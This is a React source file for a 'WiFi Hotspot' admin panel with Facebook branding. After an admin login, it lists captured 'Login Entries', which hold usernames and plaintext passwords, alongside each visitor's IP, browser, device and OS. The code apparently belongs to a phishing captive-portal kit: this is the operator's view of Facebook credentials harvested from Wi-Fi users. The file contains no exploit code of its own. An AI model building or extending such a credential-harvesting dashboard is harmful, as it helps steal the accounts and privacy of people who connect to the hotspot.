import { useEffect, useState } from 'react';
import { ItemContainer, Subtitle, Title } from './style';
import { ContentArea, Input, LoginButton } from '../../style';
import axios from '../../axios';
import { EntriesList, accessEntryType, loginEntryType } from '../../components/EntriesList';
import FacebookLogo from '../../components/FacebookLogo';
import PasswordInput from '../../components/PasswordInput';

export default () => {
	const [logged, setLogged] = useState(false);

	const checkLogged = async () => {
		const token = localStorage.getItem('token');
		if (!token) return console.log('no token found on localStorage');

		axios.defaults.headers.common['Authorization'] = `Bearer ${token}`;
		const res = await axios.get('/adminLogin', { withCredentials: true });
		if (!res || res.status !== 200) return;

		setLogged(true);
	};

	useEffect(() => {
		checkLogged();
	}, []);

	return (
		<>
			<FacebookLogo />
			<ContentArea>
				<Title>WiFi Hotspot - Admin Panel</Title>
				{logged ? <LoggedScreen /> : <LoginScreen setLogged={setLogged} />}
			</ContentArea>
		</>
	);
};

interface LoginProps {
	setLogged: (logged: boolean) => void;
}
const LoginScreen = ({ setLogged }: LoginProps) => {
	const [username, setUsername] = useState('');
	const [password, setPassword] = useState('');

	const handleLogin = async () => {
		const res = await axios.post('/adminLogin', { username, password });

		if (!res || res.status !== 200) return;
		setLogged(true);

		const token = res.data.token;
		if (!token) return;

		localStorage.setItem('token', token);
		axios.defaults.headers.common['Authorization'] = `Bearer ${token}`;
	};

	const keyDown = (e: React.KeyboardEvent) => e.key === 'Enter' && handleLogin();

	return (
		<>
			<Input
				type='text'
				placeholder='Nome de usuário'
				maxLength={64}
				value={username}
				onChange={(e) => setUsername(e.target.value)}
				onKeyDown={keyDown}
			/>
			<PasswordInput
				placeholder='Senha'
				value={password}
				onChange={(e) => setPassword(e.target.value)}
				onKeyDown={keyDown}
			/>

			<LoginButton onClick={handleLogin}>Entrar</LoginButton>
		</>
	);
};

const baseEmptyEntry = {
	id: 0,
	ip: '192.168.0.0',
	browser: 'IE',
	device: 'none',
	os: 'none',
};

const emptyLoginEntry: loginEntryType = {
	...baseEmptyEntry,
	username: 'user',
	password: '123456',
	date: new Date(),
};

const emptyAccessEntry: accessEntryType = {
	...baseEmptyEntry,
	count: 0,
	firstAccess: new Date(),
	lastAccess: new Date(),
};

const LoggedScreen = () => {
	const [loginEntries, setLoginEntries] = useState<loginEntryType[]>([emptyLoginEntry]);
	const [accessEntries, setAccessEntries] = useState<accessEntryType[]>([emptyAccessEntry]);

	const updateEntries = async () => {
		const res = await axios.get('/entries', { withCredentials: true });
		console.log('updateEntries response: ', res);
		if (!res || !res.data) return;
		setLoginEntries([...(res.data.loginEntries || emptyLoginEntry)]);
		setAccessEntries([...(res.data.accessEntries || emptyLoginEntry)]);
	};

	const deleteLoginEntry = async (id: number) => {
		await axios.delete(`/entries/${id}`, { withCredentials: true });
		updateEntries();
	};

	const deleteAccessEntry = async (id: number) => {
		await axios.delete(`/access/${id}`, { withCredentials: true });
		updateEntries();
	};

	useEffect(() => {
		updateEntries();
	}, []);

	return (
		<>
			<LoginButton onClick={updateEntries}>Atualizar</LoginButton>

			<ItemContainer>
				<Subtitle>Login Entries</Subtitle>
				<EntriesList entriesList={loginEntries} deleteEntry={deleteLoginEntry} />
			</ItemContainer>

			<ItemContainer>
				<Subtitle>Access Entries</Subtitle>
				<EntriesList entriesList={accessEntries} deleteEntry={deleteAccessEntry} />
			</ItemContainer>
		</>
	);
};
